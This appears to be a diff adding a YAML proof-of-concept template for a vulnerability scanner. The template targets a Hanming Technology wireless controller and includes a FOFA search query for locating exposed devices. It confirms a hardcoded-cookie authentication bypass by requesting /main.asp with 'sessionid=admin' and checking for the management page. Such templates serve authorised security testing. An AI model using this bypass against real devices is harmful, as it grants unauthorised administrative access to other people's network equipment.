@@ -1,0 +1,22 @@
+id: poc-yaml-hanmingtech-wuxiankongzhiqi-cookie-login
+info:
+  name: 汉明科技 无线控制器 Cookie硬编码访问漏洞
+  severity: medium
+  tags:
+  - 硬编码凭据
+  finger: 汉明科技无线控制器
+  fofa: banner=\"Server INP httpd\" || header=\"Server INP httpd\"
+requests:
+- method: GET
+  path: /main.asp
+  expression: "status_code == 200 && \ncontains(body,\"该登录用户已经不存在\") &&\ncontains(body,\"\
+    window.top.location='/login.asp'\")\n"
+- method: GET
+  path: /main.asp
+  headers:
+    Cookie: sessionid=admin
+  expression: "status_code == 200 && \n!contains(body,\"该登录用户已经不存在\") &&\n!contains(body,\"\
+    window.top.location='/login.asp'\") &&\n(\ncontains(body,\"无线管理系统\") || contains(body,\"\
+    NewBridge Management System\")\n)\n"
+variables: {}
+transport: http
